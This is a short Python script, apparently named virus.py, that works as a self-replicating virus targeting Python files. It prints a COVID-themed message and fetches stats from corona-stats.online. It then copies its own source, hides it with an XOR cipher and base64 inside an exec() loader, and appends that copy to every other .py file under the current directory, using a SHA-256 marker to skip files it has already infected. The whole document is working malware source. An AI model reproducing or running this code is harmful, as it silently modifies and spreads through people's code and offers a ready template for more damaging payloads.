#!/usr/bin/env python3
import base64
import hashlib
import os
import random
import string
from subprocess import Popen, PIPE

API = "https://corona-stats.online?top=15"


def execute_payload():
    print("######### DONT BE A COVIDIOT, STAY @ HOME #########")
    cmd1 = Popen(["curl", "-s"] + [API], stdout=PIPE)
    cmd2 = Popen(["head", "-n", "37"], stdin=cmd1.stdout)
    cmd1.wait()
    cmd2.wait()


def create_copy():
    try:
        return y
    except NameError:
        with open(os.path.basename(__file__), 'r') as source:
            data = []
            for line in source:
                data.append(line)
        return "".join(data)


def otp_keygen(size):
    return ''.join([random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(size)])


def xor_strs(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2))


def encrpyt_it(stuff_to_encrpyt):
    key = otp_keygen(len(stuff_to_encrpyt))
    cipher_text = xor_strs(stuff_to_encrpyt, key)
    return cipher_text, key


def wrap(asset):
    encrpyted_asset, key = encrpyt_it(asset)
    base64_encoded_and_encrypted = base64.b64encode(str.encode(encrpyted_asset))
    return "exec('import base64;x=base64.b64decode(str.encode(\\'{0}\\'));" \
           "y=\\'\\'.join(chr(ord(a) ^ ord(b)) for a, b in zip(x.decode(), \\'{1}\\'));" \
           "exec(y, {{\\'y\\':y}})')".format(base64_encoded_and_encrypted.decode(), key)


def check_if_infected(hash_value, file):
    real_hash = hashlib.sha256(file.encode())
    return real_hash.hexdigest() == hash_value


def infect(troy):
    for root, _, files in os.walk('.'):
        for file in files:
            relative_path = root + '/' + file
            if file.endswith(".py") and relative_path != "./virus.py":
                with open(relative_path, 'r') as original:
                    data = original.read().split('\n')
                    last_line = data[-1]
                    if last_line.startswith("#*!@"):
                        if check_if_infected(last_line[4:].rstrip('\n'), '\n'.join(data[:-1])):
                            continue
                        else:
                            data = '\n'.join(data[:-2])
                    else:
                        data = '\n'.join(data)
                with open(relative_path, 'w') as modified:
                    new_content = "{0}\n{1}".format(data, troy)
                    content_hash = hashlib.sha256(new_content.encode())
                    modified.write("{0}\n#*!@{1}".format(new_content, content_hash.hexdigest()))


def virus_routine():
    execute_payload()
    malicious_copy = create_copy()
    troy = wrap(malicious_copy)
    infect(troy)


virus_routine()
